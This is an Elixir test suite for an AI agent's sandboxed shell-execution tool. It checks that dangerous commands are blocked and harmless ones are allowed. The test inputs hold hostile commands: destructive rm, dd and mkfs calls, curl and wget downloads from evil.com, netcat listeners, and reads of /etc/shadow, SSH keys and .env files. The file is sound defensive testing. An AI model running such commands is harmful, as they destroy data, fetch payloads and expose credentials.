defmodule OptimalSystemAgent.Tools.Builtins.ShellExecuteTest do
  use ExUnit.Case, async: true

  alias OptimalSystemAgent.Tools.Builtins.ShellExecute

  # ---------------------------------------------------------------------------
  # Helpers
  # ---------------------------------------------------------------------------

  defp exec(command), do: ShellExecute.execute(%{"command" => command})

  # ---------------------------------------------------------------------------
  # Blocked commands
  # ---------------------------------------------------------------------------

  describe "blocked commands" do
    test "rm is blocked" do
      assert {:error, msg} = exec("rm -rf /tmp/test")
      assert msg =~ "rm"
    end

    test "sudo is blocked" do
      assert {:error, msg} = exec("sudo ls")
      assert msg =~ "sudo"
    end

    test "dd is blocked" do
      assert {:error, _} = exec("dd if=/dev/zero of=/tmp/test")
    end

    test "mkfs is blocked" do
      assert {:error, _} = exec("mkfs.ext4 /dev/sda1")
    end

    test "fdisk is blocked" do
      assert {:error, _} = exec("fdisk /dev/sda")
    end

    test "chmod is blocked" do
      assert {:error, _} = exec("chmod 777 /tmp/test")
    end

    test "chown is blocked" do
      assert {:error, _} = exec("chown root:root /tmp/test")
    end

    test "kill is blocked" do
      assert {:error, _} = exec("kill -9 1234")
    end

    test "killall is blocked" do
      assert {:error, _} = exec("killall beam.smp")
    end

    test "pkill is blocked" do
      assert {:error, _} = exec("pkill -f elixir")
    end

    test "reboot is blocked" do
      assert {:error, _} = exec("reboot")
    end

    test "shutdown is blocked" do
      assert {:error, _} = exec("shutdown -h now")
    end

    test "halt is blocked" do
      assert {:error, _} = exec("halt")
    end

    test "poweroff is blocked" do
      assert {:error, _} = exec("poweroff")
    end

    test "mount is blocked" do
      assert {:error, _} = exec("mount /dev/sda1 /mnt")
    end

    test "umount is blocked" do
      assert {:error, _} = exec("umount /mnt")
    end

    test "iptables is blocked" do
      assert {:error, _} = exec("iptables -F")
    end

    test "systemctl is blocked" do
      assert {:error, _} = exec("systemctl stop sshd")
    end

    test "passwd is blocked" do
      assert {:error, _} = exec("passwd root")
    end

    test "useradd is blocked" do
      assert {:error, _} = exec("useradd hacker")
    end

    test "userdel is blocked" do
      assert {:error, _} = exec("userdel victim")
    end

    test "nc is blocked" do
      assert {:error, _} = exec("nc -l 4444")
    end

    test "ncat is blocked" do
      assert {:error, _} = exec("ncat -l 4444")
    end

    test "curl with -o is blocked" do
      assert {:error, msg} = exec("curl -o /tmp/malware http://evil.com/payload")
      assert msg =~ "blocked pattern"
    end

    test "curl with --output is blocked" do
      assert {:error, _} = exec("curl --output /tmp/malware http://evil.com/payload")
    end

    test "wget with -O is blocked" do
      assert {:error, _} = exec("wget -O /tmp/malware http://evil.com/payload")
    end

    test "blocked command in pipeline is caught" do
      assert {:error, msg} = exec("ls | rm -rf /")
      assert msg =~ "rm"
    end

    test "blocked command after semicolon is caught" do
      assert {:error, msg} = exec("echo hi; sudo reboot")
      assert msg =~ "sudo"
    end

    test "blocked command after && is caught" do
      assert {:error, msg} = exec("echo hi && rm -rf /")
      assert msg =~ "rm"
    end

    test "blocked command after || is caught" do
      assert {:error, msg} = exec("false || kill -9 1")
      assert msg =~ "kill"
    end
  end

  # ---------------------------------------------------------------------------
  # Allowed commands
  # ---------------------------------------------------------------------------

  describe "allowed commands" do
    test "echo works" do
      assert {:ok, output} = exec("echo hello sandbox")
      assert String.trim(output) == "hello sandbox"
    end

    test "date works" do
      assert {:ok, output} = exec("date +%Y")
      assert String.trim(output) =~ ~r/^\d{4}$/
    end

    test "pwd works" do
      assert {:ok, output} = exec("pwd")
      assert String.trim(output) != ""
    end

    test "whoami works" do
      assert {:ok, output} = exec("whoami")
      assert String.trim(output) != ""
    end

    test "which works" do
      assert {:ok, output} = exec("which ls")
      assert String.trim(output) =~ "ls"
    end

    test "wc works" do
      assert {:ok, output} = exec("printf 'a\nb\nc\n' | wc -l")
      assert String.trim(output) =~ "3"
    end

    test "sort and uniq work in pipeline" do
      assert {:ok, output} = exec("printf 'b\na\nb\n' | sort | uniq")
      lines = output |> String.trim() |> String.split("\n")
      assert lines == ["a", "b"]
    end

    test "empty command is blocked" do
      assert {:error, "Blocked: empty command"} = exec("")
      assert {:error, "Blocked: empty command"} = exec("   ")
    end
  end

  # ---------------------------------------------------------------------------
  # Shell injection blocking
  # ---------------------------------------------------------------------------

  describe "shell injection blocking" do
    test "backtick substitution is blocked" do
      assert {:error, msg} = exec("echo `whoami`")
      assert msg =~ "blocked pattern"
    end

    test "$() command substitution is blocked" do
      assert {:error, msg} = exec("echo $(cat /etc/shadow)")
      assert msg =~ "blocked pattern"
    end

    test "${} variable expansion is blocked" do
      assert {:error, msg} = exec("echo ${HOME}")
      assert msg =~ "blocked pattern"
    end

    test "redirect to /etc/ is blocked" do
      assert {:error, msg} = exec("echo hacked > /etc/cron.d/evil")
      assert msg =~ "blocked pattern"
    end

    test "redirect to /usr/ is blocked" do
      assert {:error, msg} = exec("echo payload > /usr/local/bin/evil")
      assert msg =~ "blocked pattern"
    end
  end

  # ---------------------------------------------------------------------------
  # Path traversal blocking
  # ---------------------------------------------------------------------------

  describe "path traversal blocking" do
    test "../../etc/ traversal is blocked" do
      assert {:error, msg} = exec("cat ../../etc/shadow")
      assert msg =~ "blocked pattern"
    end

    test "../../usr/ traversal is blocked" do
      assert {:error, msg} = exec("ls ../../usr/bin")
      assert msg =~ "blocked pattern"
    end

    test "../../var/ traversal is blocked" do
      assert {:error, msg} = exec("cat ../../var/log/auth.log")
      assert msg =~ "blocked pattern"
    end

    test "access to /etc/shadow is blocked" do
      assert {:error, msg} = exec("cat /etc/shadow")
      assert msg =~ "blocked pattern"
    end

    test "access to /etc/passwd is blocked" do
      assert {:error, msg} = exec("cat /etc/passwd")
      assert msg =~ "blocked pattern"
    end

    test "access to .ssh/id_rsa is blocked" do
      assert {:error, msg} = exec("cat ~/.ssh/id_rsa")
      assert msg =~ "blocked pattern"
    end

    test "access to .env files is blocked" do
      assert {:error, msg} = exec("cat .env")
      assert msg =~ "blocked pattern"
    end
  end

  # ---------------------------------------------------------------------------
  # Timeout enforcement
  # ---------------------------------------------------------------------------

  describe "timeout enforcement" do
    @tag timeout: 60_000
    test "command that exceeds 30s is killed" do
      assert {:error, msg} = exec("sleep 60")
      assert msg =~ "timed out"
      assert msg =~ "30"
    end
  end

  # ---------------------------------------------------------------------------
  # Output truncation
  # ---------------------------------------------------------------------------

  describe "output truncation" do
    test "output larger than 100KB is truncated" do
      # Generate ~150KB of output using seq
      assert {:ok, output} = exec("seq 1 50000")
      # If output was large enough to be truncated, check the marker
      if byte_size(output) > 100_000 do
        assert output =~ "[output truncated at 100KB]"
      end
    end

    test "small output is not truncated" do
      assert {:ok, output} = exec("echo small")
      refute output =~ "truncated"
    end
  end

  # ---------------------------------------------------------------------------
  # Background process stripping
  # ---------------------------------------------------------------------------

  describe "background process blocking" do
    test "trailing & is stripped" do
      # Should run synchronously, not background
      assert {:ok, output} = exec("echo foreground &")
      assert String.trim(output) == "foreground"
    end

    test "nohup is stripped from command" do
      assert {:ok, output} = exec("nohup echo test")
      assert output =~ "test"
    end
  end

  # ---------------------------------------------------------------------------
  # Working directory restriction
  # ---------------------------------------------------------------------------

  describe "working directory restriction" do
    test "cd outside ~/.osa/ is blocked" do
      assert {:error, msg} = exec("cd /tmp && ls")
      assert msg =~ "cd outside"
    end

    test "cd within ~/.osa/ is allowed" do
      assert :ok = validate_cd("cd ~/.osa/workspace && ls")
    end
  end

  # ---------------------------------------------------------------------------
  # Environment sanitization
  # ---------------------------------------------------------------------------

  describe "environment sanitization" do
    test "PATH is preserved" do
      assert {:ok, output} = exec("echo $PATH")
      # PATH should not be empty
      assert String.trim(output) != ""
    end

    test "HOME is preserved" do
      assert {:ok, output} = exec("echo $HOME")
      assert String.trim(output) != ""
    end
  end

  # ---------------------------------------------------------------------------
  # Metadata
  # ---------------------------------------------------------------------------

  describe "tool metadata" do
    test "name returns shell_execute" do
      assert ShellExecute.name() == "shell_execute"
    end

    test "description is a non-empty string" do
      desc = ShellExecute.description()
      assert is_binary(desc)
      assert byte_size(desc) > 0
    end

    test "parameters returns valid JSON schema" do
      params = ShellExecute.parameters()
      assert params["type"] == "object"
      assert Map.has_key?(params["properties"], "command")
      assert "command" in params["required"]
    end
  end

  # ---------------------------------------------------------------------------
  # Private test helper — validates cd restriction without executing
  # ---------------------------------------------------------------------------

  # This is a minimal helper; the real validation happens inside execute/1.
  defp validate_cd(command) do
    case exec(command) do
      {:error, msg} when is_binary(msg) ->
        if msg =~ "cd outside" do
          {:error, msg}
        else
          :ok
        end

      {:ok, _} ->
        :ok

      other ->
        other
    end
  end
end
